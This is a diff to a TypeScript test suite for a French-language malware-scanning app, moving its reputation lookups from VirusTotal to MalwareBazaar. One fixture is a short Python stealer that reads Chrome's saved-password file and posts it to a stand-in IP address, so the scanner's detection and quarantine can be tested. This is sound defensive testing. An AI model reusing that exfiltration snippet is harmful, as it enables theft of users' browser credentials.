@@ -322,10 +322,11 @@ test('Asclépios · formats des sources : MalwareBazaar, ThreatFox, URLhaus/Open
   assert.deepEqual(parseClamHsb(`${h}:1024:Win.Trojan.Exemple-1\n${'e'.repeat(32)}:10:MD5.Ignoree\n${h2}:*:Unix.Malware.Autre-2:73\n`), [{ sha: h, family: 'Win.Trojan.Exemple-1' }, { sha: h2, family: 'Unix.Malware.Autre-2' }]);
   // Le catalogue des sources : chaque source dit sa licence, et les sources « référence » ne sont pas branchées.
   for (const s of SOURCES) { assert.ok(s.licence.length > 10, `${s.id} : licence ou conditions indiquées`); assert.equal(Boolean(s.fetch), s.mode === 'automatique' && s.id !== 'firehol', `${s.id} : ${s.mode}`); }
-  assert.match(SOURCES.find((s) => s.id === 'virustotal')!.licence, /500 par jour.*interdite dans un produit ou service commercial/); assert.equal(SOURCES.find((s) => s.id === 'clamav')!.mode, 'référence', 'le moteur ClamAV n\'est pas intégré');
-  assert.equal(reputationText({ sha: h, at: '', vt: { malicious: 41, suspicious: 2, harmless: 0, undetected: 25, label: 'trojan.agenttesla' } }).malicious, true);
-  assert.equal(reputationText({ sha: h, at: '', vt: { malicious: 0, suspicious: 0, harmless: 5, undetected: 60 }, circl: { name: 'bash' } }).trusted, true);
-  assert.equal(reputationText({ sha: h, at: '', vt: 'inconnu', mb: 'inconnu', circl: 'inconnu' }).malicious, false);
+  assert.equal(SOURCES.some((s) => s.id === 'virustotal'), false, 'VirusTotal retiré (17/11/2026)'); assert.equal(SOURCES.find((s) => s.id === 'clamav')!.mode, 'référence', 'le moteur ClamAV n\'est pas intégré');
+  assert.equal(reputationText({ sha: h, at: '', mb: { family: 'AgentTesla', tags: ['stealer'] } }).malicious, true);
+  assert.equal(reputationText({ sha: h, at: '', circl: { name: 'bash' } }).trusted, true);
+  assert.equal(reputationText({ sha: h, at: '', mb: 'inconnu', circl: 'inconnu' }).malicious, false);
+  assert.doesNotMatch(reputationText({ sha: h, at: '', vt: { malicious: 60, suspicious: 0, harmless: 0, undetected: 0 } } as never).text, /VirusTotal/, 'un ancien avis VirusTotal gardé en cache n\'est plus lu');
 });
 
 // ---------------------------------------------------------------- Les incidents (signaux reliés entre applis)
@@ -534,7 +535,7 @@ test('Asclépios · mises à jour : sources interrogées, paquet testé puis act
     assert.match((await act(w, 'adresse', { lien: 'http://paypa1.com' })).text, /Imite une marque en changeant des lettres/);
     assert.match((await act(w, 'message', { texte: 'Votre colis est en attente : http://distribue.mechant-exemple.net/a.exe' })).text, /Lien connu comme dangereux[\s\S]*Ne clique sur aucun lien/);
     assert.match((await act(w, 'failles')).text, /1 failles exploitées connues[\s\S]*CVE-2026-4242 · Exemple Serveur[\s\S]*rançongiciels/);
-    assert.match((await act(w, 'sources')).text, /MalwareBazaar \(empreintes\) : 1 le \d{4}[\s\S]*VirusTotal \(réputation\) : à la demande · prête[\s\S]*FireHOL et Feodo Tracker \(adresses IP\) : tenue à jour par l'appli Méduse[\s\S]*ClamAV \(référence\) : référence, non branchée/);
+    assert.match((await act(w, 'sources')).text, /MalwareBazaar \(empreintes\) : 1 le \d{4}[\s\S]*MalwareBazaar \(recherche\) \(réputation\) : à la demande · prête[\s\S]*FireHOL et Feodo Tracker \(adresses IP\) : tenue à jour par l'appli Méduse[\s\S]*ClamAV \(référence\) : référence, non branchée/);
     assert.match((await act(w, 'versions')).text, /version 1 \(en service\).*✓ signature valide/);
     // Une liste polluée (elle contient un fichier sain du système) est refusée : l'ancienne version reste.
     mbHashes = [sha(readFileSync(new URL('../src/valhalla/types.ts', import.meta.url)))];
@@ -560,14 +561,14 @@ test('Asclépios · réputation en ligne : seule l\'empreinte part, jamais le fi
     const bad = 'import os,requests\nd=open(os.path.expanduser("~/.config/google-chrome/Default/Login Data"),"rb").read()\nrequests.post("http://203.0.113.5/u",data=d) # secret-du-fichier-A\n';
     const good = 'import os,requests\nd=open(os.path.expanduser("~/.config/chromium/Default/Login Data"),"rb").read()\nrequests.post("https://ma-sauvegarde.exemple.fr/u",data=d) # secret-du-fichier-B\n';
     w.routes.push(
-      [/virustotal\.com\/api\/v3\/files\//, (url) => (url.endsWith(sha(bad)) ? Response.json({ data: { attributes: { last_analysis_stats: { malicious: 38, suspicious: 1, harmless: 0, undetected: 30 }, popular_threat_classification: { suggested_threat_label: 'trojan.stealer' } } } }) : new Response('{}', { status: 404 }))],
-      [/mb-api\.abuse\.ch\/api\/v1/, () => Response.json({ query_status: 'hash_not_found' })],
+      [/virustotal\.com/, () => Response.json({ data: { attributes: { last_analysis_stats: { malicious: 60 } } } })],
+      [/mb-api\.abuse\.ch\/api\/v1/, (_url, init) => (String(init?.body ?? '').includes(sha(bad)) ? Response.json({ query_status: 'ok', data: [{ signature: 'Stealer.Essai', tags: ['stealer'], file_type: 'py' }] }) : Response.json({ query_status: 'hash_not_found' }))],
       [/hashlookup\.circl\.lu/, (url) => (url.endsWith(sha(good)) ? Response.json({ FileName: 'sauvegarde-navigateur.py', ProductName: 'Outil de sauvegarde' }) : new Response('{}', { status: 404 }))],
     );
     writeFileSync(join(d, 'a.py'), bad);
     const r = await act(w, 'analyser', { dossier: d });
     assert.match(r.text, /\[critique\] Lit les mots de passe du navigateur et les envoie ailleurs — .*a\.py \(en quarantaine\)/, 'soupçon confirmé par la réputation');
-    assert.match((w.v.ctx('ullr').settings.hits as Array<{ why: string[] }>)[0].why.join(' '), /VirusTotal : 39 antivirus sur 69 le jugent dangereux \(trojan\.stealer\)/);
+    assert.match((w.v.ctx('ullr').settings.hits as Array<{ why: string[] }>)[0].why.join(' '), /MalwareBazaar : malware connu \(Stealer\.Essai\)/);
     writeFileSync(join(d, 'b.py'), good);
     const r2 = await act(w, 'analyser', { dossier: d });
     assert.match(r2.text, /\[moyenne\] Lit les mots de passe.*b\.py \(à vérifier\)/); assert.ok(existsSync(join(d, 'b.py')));
@@ -575,12 +576,9 @@ test('Asclépios · réputation en ligne : seule l\'empreinte part, jamais le fi
     // Rien d'autre que des empreintes n'est parti, la clé est dans l'en-tête (jamais dans l'adresse), une seule demande par empreinte (cache).
     const net = w.fetched.filter((f) => /virustotal|abuse\.ch|circl/.test(f.url));
     assert.ok(net.length >= 4 && net.every((f) => !/secret-du-fichier/.test(f.url + f.body)), 'aucun contenu de fichier envoyé');
-    assert.ok(net.every((f) => !f.url.includes('cle-vt-de-test')));
-    assert.ok(net.filter((f) => /virustotal/.test(f.url)).every((f) => /\/files\/[a-f0-9]{64}$/.test(f.url) && f.method === 'GET'), 'VirusTotal : consultation d\'une empreinte, jamais d\'envoi');
-    const before = w.fetched.length; assert.match((await act(w, 'reputation', { empreinte: sha(bad) })).text, /VirusTotal : 39 antivirus/); assert.equal(w.fetched.length, before, 'réponse gardée 7 jours : pas de nouvelle demande');
-    // Quota VirusTotal (4 par minute) : la demande suivante immédiate ne part pas vers VirusTotal.
-    await act(w, 'reputation', { empreinte: 'f'.repeat(64) });
-    assert.ok(!w.fetched.slice(before).some((f) => /virustotal/.test(f.url)), 'pas plus d\'une demande VirusTotal toutes les 16 secondes');
+    assert.ok(net.every((f) => !f.url.includes('cle-abuse-de-test') && !f.url.includes('cle-vt-de-test')), 'aucune clé dans une adresse');
+    assert.equal(net.filter((f) => /virustotal/.test(f.url)).length, 0, 'VirusTotal n\'est plus jamais appelé, même avec sa clé');
+    const before = w.fetched.length; assert.match((await act(w, 'reputation', { empreinte: sha(bad) })).text, /MalwareBazaar : malware connu/); assert.equal(w.fetched.length, before, 'réponse gardée 7 jours : pas de nouvelle demande');
     await assert.rejects(async () => { const x = await act(w, 'reputation', { empreinte: 'pas une empreinte' }); if (x.ok === false) throw new Error(x.text); }, /empreinte SHA-256 attendue/);
   } finally { w.end(); }
 });
@@ -603,16 +601,16 @@ test('Asclépios · clés des sources : rangées avec les secrets d\'Odin, jamai
   const w = world(), saved: Array<[string, string]> = [];
   try {
     ullrKeys((n, v) => { saved.push([n, v]); process.env[n] = v; });
-    assert.match((await act(w, 'cles')).text, /Clé abuse\.ch : absente · clé VirusTotal : absente/);
+    assert.match((await act(w, 'cles')).text, /^Clé abuse\.ch : absente\. Les clés ne sont jamais affichées\.$/);
     assert.match((await act(w, 'cles', { abuse_ch: 'avec espace interdit' })).text, /n'a pas la bonne forme/);
     assert.deepEqual(saved, []);
     w.routes.push([/abuse\.ch/, () => new Response('', { status: 401 })]);
     const r = await act(w, 'cles', { abuse_ch: 'CleSecreteDeTest0123456789', virustotal: 'AutreCleSecrete9876543210abcdef' });
-    assert.deepEqual(saved, [['ABUSE_CH_KEY', 'CleSecreteDeTest0123456789'], ['VT_API_KEY', 'AutreCleSecrete9876543210abcdef']]);
-    assert.match(r.text, /Clé abuse\.ch et VirusTotal rangée avec les secrets d'Odin/); assert.match(r.text, /✗ MalwareBazaar : mb-api\.abuse\.ch a répondu 401 \(clé refusée ou accès non autorisé\)/, 'les trois sources sont essayées tout de suite, et un refus est dit clairement');
+    assert.deepEqual(saved, [['ABUSE_CH_KEY', 'CleSecreteDeTest0123456789']], 'une clé VirusTotal n\'est plus rangée');
+    assert.match(r.text, /Clé abuse\.ch rangée avec les secrets d'Odin/); assert.match(r.text, /✗ MalwareBazaar : mb-api\.abuse\.ch a répondu 401 \(clé refusée ou accès non autorisé\)/, 'les trois sources sont essayées tout de suite, et un refus est dit clairement');
     const page = JSON.stringify(await ullr.view!(w.v.ctx('ullr'), new URLSearchParams())) + r.text + (await act(w, 'cles')).text + (await act(w, 'sources')).text + JSON.stringify(w.v.ctx('ullr').settings);
     assert.ok(!/CleSecreteDeTest|AutreCleSecrete/.test(page), 'aucune clé dans la page, les réponses ou les réglages de l\'appli');
-    assert.match(page, /abuse\.ch : présente · VirusTotal : présente/);
+    assert.match(page, /abuse\.ch : présente\)/); assert.doesNotMatch(page, /VirusTotal/);
   } finally { ullrKeys(undefined); w.end(); }
 });
 
